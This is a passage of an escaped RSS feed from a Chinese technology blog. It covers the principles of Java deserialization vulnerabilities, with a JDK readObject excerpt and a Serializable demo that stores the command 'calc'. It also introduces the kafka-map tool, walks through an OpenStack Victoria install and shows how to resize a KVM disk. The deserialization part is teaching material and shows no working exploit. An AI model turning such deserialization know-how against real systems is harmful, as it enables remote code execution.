&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ObjectInputStream.&lt;span style="color:#a6e22e">GetField&lt;/span> gf &lt;span style="color:#f92672">=&lt;/span> ois.&lt;span style="color:#a6e22e">readFields&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Object valObj &lt;span style="color:#f92672">=&lt;/span> gf.&lt;span style="color:#a6e22e">get&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;val&amp;#34;&lt;/span>, &lt;span style="color:#66d9ef">null&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (valObj &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> val &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#66d9ef">else&lt;/span> &lt;span style="color:#66d9ef">if&lt;/span> (valObj &lt;span style="color:#66d9ef">instanceof&lt;/span> String) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> val&lt;span style="color:#f92672">=&lt;/span> valObj;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#66d9ef">else&lt;/span> &lt;span style="color:#66d9ef">if&lt;/span> (System.&lt;span style="color:#a6e22e">getSecurityManager&lt;/span>() &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">||&lt;/span> valObj &lt;span style="color:#66d9ef">instanceof&lt;/span> Long
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">||&lt;/span> valObj &lt;span style="color:#66d9ef">instanceof&lt;/span> Integer
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">||&lt;/span> valObj &lt;span style="color:#66d9ef">instanceof&lt;/span> Float
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">||&lt;/span> valObj &lt;span style="color:#66d9ef">instanceof&lt;/span> Double
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">||&lt;/span> valObj &lt;span style="color:#66d9ef">instanceof&lt;/span> Byte
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">||&lt;/span> valObj &lt;span style="color:#66d9ef">instanceof&lt;/span> Short
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">||&lt;/span> valObj &lt;span style="color:#66d9ef">instanceof&lt;/span> Boolean) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> val &lt;span style="color:#f92672">=&lt;/span> valObj.&lt;span style="color:#a6e22e">toString&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#66d9ef">else&lt;/span> { &lt;span style="color:#75715e">// the serialized object is from a version without JDK-8019292 fix&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> val &lt;span style="color:#f92672">=&lt;/span> System.&lt;span style="color:#a6e22e">identityHashCode&lt;/span>(valObj) &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">&amp;#34;@&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> valObj.&lt;span style="color:#a6e22e">getClass&lt;/span>().&lt;span style="color:#a6e22e">getName&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>小伙伴们可能会很迷茫，这要何从下手？&lt;/p></description></item><item><title>Java 反序列化漏洞原理（一）Serializable</title><link>https://www.typesafe.cn/posts/java-serialization-vulnerability-1/</link><pubDate>Thu, 14 Oct 2021 23:00:00 +0800</pubDate><guid>https://www.typesafe.cn/posts/java-serialization-vulnerability-1/</guid><description>&lt;h2 id="声明">声明&lt;/h2>
&lt;p>本文章中所有内容仅供学习交流，严禁用于非法用途，否则由此产生的一切后果均与作者无关。&lt;/p>
&lt;h2 id="序列化的定义">序列化的定义&lt;/h2>
&lt;p>序列化是指将数据结构或对象状态转换成可取用格式，以留待后续在相同或另一台计算机环境中，能恢复原先状态的过程。依照序列化格式重新获取字节的结果时，可以利用它来产生与原始对象相同语义的副本。&lt;/p>
&lt;h2 id="java-中的序列化">Java 中的序列化&lt;/h2>
&lt;p>Java 自身提供了序列化的功能，需要实现 &lt;code>java.io.Serializable&lt;/code> 接口，标明该对象是可序列化的。 &lt;code>java.io.Serializable&lt;/code> 是一个空接口，不需要对象实现方法。&lt;/p>
&lt;p>以下面这段代码为例，展示了一个对象的序列化和反序列化的过程。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> java.io.*;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> java.nio.charset.StandardCharsets;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> java.util.Base64;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">Eval0&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">Command&lt;/span> &lt;span style="color:#66d9ef">implements&lt;/span> Serializable {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">private&lt;/span> String cmd;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">public&lt;/span> String &lt;span style="color:#a6e22e">getCmd&lt;/span>() {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> cmd;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">setCmd&lt;/span>(String cmd) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">this&lt;/span>.&lt;span style="color:#a6e22e">cmd&lt;/span> &lt;span style="color:#f92672">=&lt;/span> cmd;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>(String&lt;span style="color:#f92672">[]&lt;/span> args) &lt;span style="color:#66d9ef">throws&lt;/span> Exception {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 定义一个对象&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Command command &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> Command();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> command.&lt;span style="color:#a6e22e">setCmd&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;calc&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> System.&lt;span style="color:#a6e22e">out&lt;/span>.&lt;span style="color:#a6e22e">println&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;序列化前: &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> command.&lt;span style="color:#a6e22e">getCmd&lt;/span>());
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 将用户序列化为字节数组&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ByteArrayOutputStream buffer &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> ByteArrayOutputStream();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">try&lt;/span> (ObjectOutputStream outputStream &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> ObjectOutputStream(buffer)) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> outputStream.&lt;span style="color:#a6e22e">writeObject&lt;/span>(command);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 将字节数组进行base64编码，无论是通过网络或者是文件都可以发送到另一个系统进行反序列化&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">final&lt;/span> String data &lt;span style="color:#f92672">=&lt;/span> Base64.&lt;span style="color:#a6e22e">getEncoder&lt;/span>().&lt;span style="color:#a6e22e">encodeToString&lt;/span>(buffer.&lt;span style="color:#a6e22e">toByteArray&lt;/span>());
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> System.&lt;span style="color:#a6e22e">out&lt;/span>.&lt;span style="color:#a6e22e">println&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;序列化后: &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> data);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 将base64编码的数据再解码为字节数组&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">final&lt;/span> &lt;span style="color:#66d9ef">byte&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> bytes &lt;span style="color:#f92672">=&lt;/span> Base64.&lt;span style="color:#a6e22e">getDecoder&lt;/span>().&lt;span style="color:#a6e22e">decode&lt;/span>(data.&lt;span style="color:#a6e22e">getBytes&lt;/span>(StandardCharsets.&lt;span style="color:#a6e22e">UTF_8&lt;/span>));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 将字节数组反序列化为对象&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ByteArrayInputStream b &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> ByteArrayInputStream(bytes);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">try&lt;/span> (ObjectInputStream input &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> ObjectInputStream(b)) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">final&lt;/span> Command obj &lt;span style="color:#f92672">=&lt;/span> (Command) input.&lt;span style="color:#a6e22e">readObject&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> System.&lt;span style="color:#a6e22e">out&lt;/span>.&lt;span style="color:#a6e22e">println&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;反序列化: &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> obj.&lt;span style="color:#a6e22e">getCmd&lt;/span>());
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>运行后输出：&lt;/p></description></item><item><title>分享一款非常好用的kafka可视化web管理工具</title><link>https://www.typesafe.cn/posts/share-a-kafka-web-manager/</link><pubDate>Sun, 13 Jun 2021 00:00:00 +0800</pubDate><guid>https://www.typesafe.cn/posts/share-a-kafka-web-manager/</guid><description>&lt;p>使用过&lt;code>kafka&lt;/code>的小伙伴应该都知道&lt;code>kafka&lt;/code>本身是没有管理界面的，所有操作都需要手动执行命令来完成。但有些命令又多又长，如果没有做笔记，别说是新手，就连老手也不一定能记得住，每次想要使用的时候都要上网搜索一下。有些崇尚geek精神的人或许觉得命令行才是真爱，但使用一款好用的可视化管理工具真的可以极大的提升效率。&lt;/p>
&lt;p>今天给大家介绍的这款工具叫做&lt;code>kafka-map&lt;/code>，是我针对日常工作中高频使用的场景开发的，使用了这款工具之后就不必费心费力的去查资料某个命令要怎么写，就像是：“给编程插上翅膀，给kafka装上导航”。&lt;/p>
&lt;h2 id="kafka-map-介绍">kafka-map 介绍&lt;/h2>
&lt;p>&lt;code>kafka map&lt;/code>是使用&lt;code>Java11&lt;/code>和&lt;code>React&lt;/code>开发的一款&lt;code>kafka&lt;/code>可视化工具。&lt;/p>
&lt;p>目前支持的功能有：&lt;/p>
&lt;ul>
&lt;li>多集群管理&lt;/li>
&lt;li>集群状态监控（分区数量、副本数量、存储大小、offset）&lt;/li>
&lt;li>主题创建、删除、扩容（删除需配置delete.topic.enable = true）&lt;/li>
&lt;li>broker状态监控&lt;/li>
&lt;li>消费者组查看、删除&lt;/li>
&lt;li>重置offset&lt;/li>
&lt;li>消息查询（支持String和json方式展示）&lt;/li>
&lt;li>发送消息（支持向指定的topic和partition发送字符串消息）&lt;/li>
&lt;/ul>
&lt;h2 id="功能截图">功能截图&lt;/h2>
&lt;h3 id="添加集群">添加集群&lt;/h3>
&lt;p>&lt;img src="https://gitee.com/dushixiang/kafka-map/raw/master/screenshot/import-cluster.png" alt="添加集群">&lt;/p>
&lt;h3 id="集群管理">集群管理&lt;/h3>
&lt;p>&lt;img src="https://gitee.com/dushixiang/kafka-map/raw/master/screenshot/clusters.png" alt="集群管理">&lt;/p>
&lt;h3 id="broker">broker&lt;/h3>
&lt;p>&lt;img src="https://gitee.com/dushixiang/kafka-map/raw/master/screenshot/brokers.png" alt="broker">&lt;/p>
&lt;h3 id="主题管理">主题管理&lt;/h3>
&lt;p>&lt;img src="https://gitee.com/dushixiang/kafka-map/raw/master/screenshot/topics.png" alt="主题管理">&lt;/p>
&lt;h3 id="消费组">消费组&lt;/h3>
&lt;p>&lt;img src="https://gitee.com/dushixiang/kafka-map/raw/master/screenshot/consumers.png" alt="消费组">&lt;/p>
&lt;h3 id="查看消费组已订阅主题">查看消费组已订阅主题&lt;/h3>
&lt;p>&lt;img src="https://gitee.com/dushixiang/kafka-map/raw/master/screenshot/consumer-subscription.png" alt="消费组详情">&lt;/p>
&lt;h3 id="topic详情分区">topic详情——分区&lt;/h3>
&lt;p>&lt;img src="https://gitee.com/dushixiang/kafka-map/raw/master/screenshot/topic-info-partition.png" alt="topic详情——分区">&lt;/p>
&lt;h3 id="topic详情broker">topic详情——broker&lt;/h3>
&lt;p>&lt;img src="https://gitee.com/dushixiang/kafka-map/raw/master/screenshot/topic-info-broker.png" alt="topic详情——broker">&lt;/p>
&lt;h3 id="topic详情消费组">topic详情——消费组&lt;/h3>
&lt;p>&lt;img src="https://gitee.com/dushixiang/kafka-map/raw/master/screenshot/topic-info-consumer.png" alt="topic详情——消费组">&lt;/p>
&lt;h3 id="topic详情消费组重置offset">topic详情——消费组重置offset&lt;/h3>
&lt;p>&lt;img src="https://gitee.com/dushixiang/kafka-map/raw/master/screenshot/topic-info-consumer-reset-offset.png" alt="topic详情——消费组重置offset">&lt;/p>
&lt;h3 id="topic详情配置信息">topic详情——配置信息&lt;/h3>
&lt;p>&lt;img src="https://gitee.com/dushixiang/kafka-map/raw/master/screenshot/topic-info-config.png" alt="topic详情——配置信息">&lt;/p>
&lt;h3 id="生产消息">生产消息&lt;/h3>
&lt;p>&lt;img src="https://gitee.com/dushixiang/kafka-map/raw/master/screenshot/producer-message.png" alt="消费消息">&lt;/p>
&lt;h3 id="消费消息">消费消息&lt;/h3>
&lt;p>&lt;img src="https://gitee.com/dushixiang/kafka-map/raw/master/screenshot/consumer-message.png" alt="消费消息">&lt;/p>
&lt;h2 id="docker-方式安装">docker 方式安装&lt;/h2>
&lt;p>一行命令即可完成安装&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-shell" data-lang="shell">&lt;span style="display:flex;">&lt;span>docker run -d &lt;span style="color:#ae81ff">\
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">&lt;/span> -p 8080:8080 &lt;span style="color:#ae81ff">\
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">&lt;/span> -v /opt/kafka-map/data:/usr/local/kafka-map/data &lt;span style="color:#ae81ff">\
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">&lt;/span> -e DEFAULT_USERNAME&lt;span style="color:#f92672">=&lt;/span>admin
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> -e DEFAULT_PASSWORD&lt;span style="color:#f92672">=&lt;/span>admin
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> --name kafka-map &lt;span style="color:#ae81ff">\
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">&lt;/span> --restart always dushixiang/kafka-map:latest
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>更多安装方式以及相信信息可查看: &lt;a href="https://github.com/dushixiang/kafka-map">https://github.com/dushixiang/kafka-map&lt;/a>&lt;/p></description></item><item><title>openstack victoria版安装</title><link>https://www.typesafe.cn/posts/install-openstack-victoria/</link><pubDate>Sat, 12 Jun 2021 00:00:00 +0800</pubDate><guid>https://www.typesafe.cn/posts/install-openstack-victoria/</guid><description>&lt;p>近期公司业务需求，需要安装一套Openstack环境学习，看了一下现在已经出了&lt;code>wallaby&lt;/code>版了，我果断选择了上一个版本&lt;code>victoria&lt;/code>。因为没有足够多的物理服务器了，只好找了一台64核256G内存6T硬盘的机器来创建几台虚拟机来搭环境了。&lt;/p>
&lt;h1 id="实验环境">实验环境&lt;/h1>
&lt;p>此次实验使用到了三台虚拟机，都是使用centos8系统，一台机器当作控制和网络节点，另外两台当作计算节点，使用OVS+VLAN的网络模式，eth0作为管理网络，eth1互相连接到OVS网桥上模拟trunk网卡，controller多增加一个eth2用于访问外部网络。&lt;/p>
&lt;table>
 &lt;thead>
 &lt;tr>
 &lt;th>节点&lt;/th>
 &lt;th>作用&lt;/th>
 &lt;th>eth0&lt;/th>
 &lt;th>eth1&lt;/th>
 &lt;th>eth2&lt;/th>
 &lt;/tr>
 &lt;/thead>
 &lt;tbody>
 &lt;tr>
 &lt;td>controller&lt;/td>
 &lt;td>控制节点、网络节点&lt;/td>
 &lt;td>172.16.10.100&lt;/td>
 &lt;td>无IP&lt;/td>
 &lt;td>桥接，无IP&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>compute-101&lt;/td>
 &lt;td>计算节点&lt;/td>
 &lt;td>172.16.10.101&lt;/td>
 &lt;td>无IP&lt;/td>
 &lt;td>❌&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>compute-102&lt;/td>
 &lt;td>计算节点&lt;/td>
 &lt;td>172.16.10.102&lt;/td>
 &lt;td>无IP&lt;/td>
 &lt;td>❌&lt;/td>
 &lt;/tr>
 &lt;/tbody>
&lt;/table>
&lt;h1 id="安装虚拟机">安装虚拟机&lt;/h1>
&lt;h2 id="安装依赖">安装依赖&lt;/h2>
&lt;p>安装KVM和Linux网桥&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>yum install -y qemu-kvm libvirt virt-install bridge-utils virt-manager dejavu-lgc-sans-fonts
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;blockquote>
&lt;p>&lt;code>dejavu-lgc-sans-fonts&lt;/code>用于解决 &lt;code>virt-manaer&lt;/code> 乱码&lt;/p>&lt;/blockquote>
&lt;p>启动&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>systemctl enable libvirtd &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> systemctl start libvirtd
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>安装OVS&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>yum install openvswitch
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>启动OVS&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>systemctl enable openvswitch &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> systemctl start openvswitch
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="创建虚拟机">创建虚拟机&lt;/h3>
&lt;p>使用 virt-manager 创建三台虚拟机&lt;/p>
&lt;p>&lt;img src="https://oss.typesafe.cn/vm-nodes.png" alt="image-20210604140054913">&lt;/p>
&lt;h3 id="配置网络">配置网络&lt;/h3>
&lt;h4 id="配置管理网卡">配置管理网卡&lt;/h4>
&lt;p>给虚拟机配置桥接网络，参考&lt;a href="https://typesafe.cn/posts/linux-kvm/">Linux虚拟化技术KVM&lt;/a>，效果如图&lt;/p>
&lt;p>&lt;img src="https://oss.typesafe.cn/vm-manage-port-config.png" alt="">&lt;/p>
&lt;h4 id="配置trunk网卡">配置trunk网卡&lt;/h4>
&lt;p>使用ovs创建一个虚拟网桥。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>ovs-vsctl add-br br-vlan
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>此时网桥&lt;code>br-vlan&lt;/code>上是没有任何虚拟网卡的，然后关闭虚拟机，在&lt;code>virt-manager&lt;/code>上添加一个网络设备&lt;/p></description></item><item><title>KVM 虚拟机磁盘扩容</title><link>https://www.typesafe.cn/posts/kvm-disk-resize/</link><pubDate>Mon, 31 May 2021 19:20:00 +0800</pubDate><guid>https://www.typesafe.cn/posts/kvm-disk-resize/</guid><description>&lt;h3 id="一镜像扩容">一、镜像扩容&lt;/h3>
&lt;p>注意：需要先关闭虚拟机才能操作，&lt;code>+&lt;/code>号前面有空格，后面没有空格。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>qemu-img resize test.qcow2 +80G
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>原镜像磁盘大小20GB，扩容完成后可使用以下命令查看&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>qemu-img info test.qcow2
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>输出&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>image: test.qcow2
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>file format: qcow2
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>virtual size: 100G &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#ae81ff">107374182400&lt;/span> bytes&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>disk size: 885M
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>cluster_size: &lt;span style="color:#ae81ff">65536&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Format specific information:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> compat: 1.1
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> lazy refcounts: false
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> refcount bits: &lt;span style="color:#ae81ff">16&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> corrupt: false
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="二windows磁盘扩容">二、Windows磁盘扩容&lt;/h3>
&lt;p>Windows磁盘扩容比较方便，进入 &lt;strong>计算机管理&amp;gt;磁盘管理&lt;/strong> 找到新增的分区把它添加到需要的分区即可。&lt;/p>
&lt;h3 id="三linux磁盘扩容">三、Linux磁盘扩容&lt;/h3>
&lt;p>启动虚拟机后，进入虚拟机控制台，使用&lt;code>fdisk -l&lt;/code>命令查看磁盘信息。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>Disk /dev/vda: &lt;span style="color:#ae81ff">100&lt;/span> GiB, &lt;span style="color:#ae81ff">107374182400&lt;/span> bytes, &lt;span style="color:#ae81ff">209715200&lt;/span> sectors
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Units: sectors of &lt;span style="color:#ae81ff">1&lt;/span> * 512 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">512&lt;/span> bytes
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Sector size &lt;span style="color:#f92672">(&lt;/span>logical/physical&lt;span style="color:#f92672">)&lt;/span>: &lt;span style="color:#ae81ff">512&lt;/span> bytes / &lt;span style="color:#ae81ff">512&lt;/span> bytes
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>I/O size &lt;span style="color:#f92672">(&lt;/span>minimum/optimal&lt;span style="color:#f92672">)&lt;/span>: &lt;span style="color:#ae81ff">512&lt;/span> bytes / &lt;span style="color:#ae81ff">512&lt;/span> bytes
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Disklabel type: dos
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Disk identifier: 0xe11f7f01
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Device Boot Start End Sectors Size Id Type
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>/dev/vda1 * &lt;span style="color:#ae81ff">2048&lt;/span> &lt;span style="color:#ae81ff">2099199&lt;/span> &lt;span style="color:#ae81ff">2097152&lt;/span> 1G &lt;span style="color:#ae81ff">83&lt;/span> Linux
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>/dev/vda2 &lt;span style="color:#ae81ff">2099200&lt;/span> &lt;span style="color:#ae81ff">41943039&lt;/span> &lt;span style="color:#ae81ff">39843840&lt;/span> 19G 8e Linux LVM
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Disk /dev/mapper/cl-root: &lt;span style="color:#ae81ff">17&lt;/span> GiB, &lt;span style="color:#ae81ff">18249416704&lt;/span> bytes, &lt;span style="color:#ae81ff">35643392&lt;/span> sectors
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Units: sectors of &lt;span style="color:#ae81ff">1&lt;/span> * 512 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">512&lt;/span> bytes
